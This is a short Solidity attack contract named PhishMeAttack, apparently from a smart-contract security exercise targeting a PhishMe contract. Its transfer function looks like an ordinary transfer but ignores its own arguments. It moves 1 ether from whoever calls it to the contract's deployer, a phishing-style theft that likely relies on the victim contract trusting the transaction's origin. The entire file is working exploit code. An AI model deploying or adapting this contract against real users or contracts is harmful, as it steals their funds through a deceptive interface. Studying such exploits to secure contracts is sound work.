pragma solidity ^0.8.0;

import {PhishMe} from "./PhishMe.sol";

contract PhishMeAttack {

    PhishMe phishMe;
    address attacker;

    constructor(PhishMe _phishMe) {
        phishMe = _phishMe;
        attacker = msg.sender;
    }

    function transfer(address _from, address  _to, uint _amount) public {
        phishMe.transfer(msg.sender, attacker, 1 ether);
    }
}